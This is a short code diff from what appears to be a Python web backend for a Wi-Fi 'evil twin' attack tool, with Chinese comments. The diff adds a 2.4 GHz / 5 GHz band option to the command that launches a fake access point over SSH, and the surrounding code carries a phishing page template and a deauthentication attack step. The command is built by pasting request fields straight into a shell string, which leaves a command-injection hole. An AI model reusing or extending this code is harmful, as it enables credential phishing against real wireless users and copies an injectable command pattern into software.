@@ -25,6 +25,7 @@ class AttackRequest(BaseModel):
     ap_interface: str = "wlan1"  # 发射热点的网卡
     ssid: str = "Free_WiFi"  # 伪造的 WiFi 名称
     template_html: str = ""  # 钓鱼页面 HTML 内容
+    band: str = "2.4g"  # 新增参数: '2.4g' 或 '5g'
 
 
 class AIAnalysisRequest(BaseModel):
@@ -255,7 +256,7 @@ async def start_evil_twin(req: AttackRequest):
         # 先初始化日志文件
         ssh_client.exec_command("echo '[System] Initializing Fake AP...' > /tmp/eviltwin.log")
 
-        et_cmd = f"nohup python3 {remote_et} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
+        et_cmd = f"nohup python3 {remote_et} --interface {req.ap_interface} --ssid '{req.ssid}' --channel {req.channel} --band {req.band} --template \"{clean_html}\" >> /tmp/eviltwin.log 2>&1 &"
         ssh_client.exec_command(et_cmd)
 
         # 4. 启动 Deauth 攻击 (后台运行，日志输出到 /tmp/et_deauth.log)
